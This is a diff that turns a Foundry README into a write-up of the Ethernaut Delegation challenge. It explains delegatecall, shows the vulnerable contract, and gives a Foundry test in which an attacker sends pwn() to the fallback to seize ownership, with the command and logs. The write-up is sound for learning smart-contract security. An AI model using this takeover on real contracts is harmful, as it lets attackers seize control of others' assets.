@@ -1,66 +1,124 @@
-## Foundry
+# What is OpenZeppelin Ethernaut?
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.
 
-Foundry consists of:
+OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+<br>
 
-## Documentation
+# What You're Supposed to Do?
 
-https://book.getfoundry.sh/
+in `06-Delegation` Challenge, You Should Try To find a Way to Take Ownership of `Delegation` Contract with `delegatecall`.
 
-## Usage
+`06-Delegation` Challenge Link: [https://ethernaut.openzeppelin.com/level/6](https://ethernaut.openzeppelin.com/level/6)
 
-### Build
+<br>
 
-```shell
-$ forge build
+# How did i Complete This Challenge?
+
+To complete this challenge, you should first understand how `delegatecall` works.
+
+Think of `delegatecall` as borrowing a function from another contract and using it only once before returning it. What you should keep in mind is that when we borrow a function from another contract, we execute it in the context of the calling contract's state. This means the state variables and storage of the contract that made the `delegatecall` will change, not the state variables and storage of the target contract.
+
+Now Lets take a Look At the Codebase:
+
+in `Delegation` Contract We Have an Fallback Function, Which is Executed When a Function that does not exist is called or Ether is sent directly to a contract but `receive()` does not exist or `msg.data` is not empty.
+
+```javascript
+    contract Delegation {
+        address public owner;
+        Delegate delegate;
+
+        constructor(address _delegateAddress) {
+            delegate = Delegate(_delegateAddress);
+            owner = msg.sender;
+        }
+
+        fallback() external {
+            (bool result,) = address(delegate).delegatecall(msg.data);
+            if (result) {
+                this;
+            }
+        }
+    }
 ```
 
-### Test
+What Attacker Would Do is trigger the `fallback()` function with `bytes memory data = abi.encodeWithSignature("pwn()");` as `msg.data`.
 
-```shell
-$ forge test
+What Will This Do is, Is Gonna `delegatecall` target Contract `pwn()` function. Basically We Gonna Borrow the `pwn()` function from target Contract and Place it in our Contract, then After
+We Executed it, We Gonna Give it Back.
+
+So When the `delegatecall` to target Contract is Made, Our `Delegation` Contract, Looks Like this:
+
+```javascript
+    contract Delegation {
+        address public owner;
+        Delegate delegate;
+
+        constructor(address _delegateAddress) {
+            delegate = Delegate(_delegateAddress);
+            owner = msg.sender;
+        }
+
+        function pwn() public {
+            owner = msg.sender;
+        }   
+
+        fallback() external {
+            (bool result,) = address(delegate).delegatecall(msg.data);
+            if (result) {
+                this;
+            }
+        }
+    }
 ```
 
-### Format
+then We Execute `pwn()` with Context of the `Delegation` Contract and then we Give it Back. 
 
-```shell
-$ forge fmt
+What `pwn()` function it stores `msg.sender` in `owner` variable. in This Particular Example the `msg.sender` is the One that Triggered the `fallback()` function.
+
+also i Wrote Test For this Attack, it's Called `testtakeOwnerShipOfContractWithDelegateCall` inside the `Delegation.t.sol`:
+
+
+```javascript
+    function testtakeOwnerShipOfContractWithDelegateCall() public {
+        vm.startPrank(ownerOfDelegationContract);
+        assertEq(ownerOfDelegationContract, delegation.owner());
+        console.log("Delegation Contract Owner Address: ", ownerOfDelegationContract);
+        console.log("Attacker Address: ", attacker);
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature("pwn()");
+        console.log("Current Owner Of Delegation Contract Before the Attack: ", delegation.owner());
+        (bool success, ) = address(delegation).call(data);
+        require(success, "Low Level Call Failed!");
+        console.log("Current Owner Of Delegation Contract Before the Attack: ", delegation.owner());
+        assertEq(attacker, delegation.owner());
+        vm.stopPrank();
+    }
 ```
 
-### Gas Snapshots
+You Can Run This Test inside Your Terminal With Following Command:
 
-```shell
-$ forge snapshot
+```javascript
+    forge test --match-test testtakeOwnerShipOfContractWithDelegateCall -vvvv
 ```
 
-### Anvil
+Take a Look at the `Logs`:
 
-```shell
-$ anvil
+```javascript
+    Logs:
+        Delegation Contract Owner Address:  0xf96Fa8Ef1e8D70d88ce300ED942026Fa0270262c
+        Attacker Address:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
+        Current Owner Of Delegation Contract Before the Attack:  0xf96Fa8Ef1e8D70d88ce300ED942026Fa0270262c
+        Current Owner Of Delegation Contract Before the Attack:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
 ```
 
-### Deploy
+<br>
 
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
+### i Hope this Made Sense for You, if it doesn't, then i recommend You Read this Two Documents About `delegatecall`:
 
-### Cast
+1. [https://solidity-by-example.org/delegatecall/](https://solidity-by-example.org/delegatecall/)
+2. [https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7](https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7)
 
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
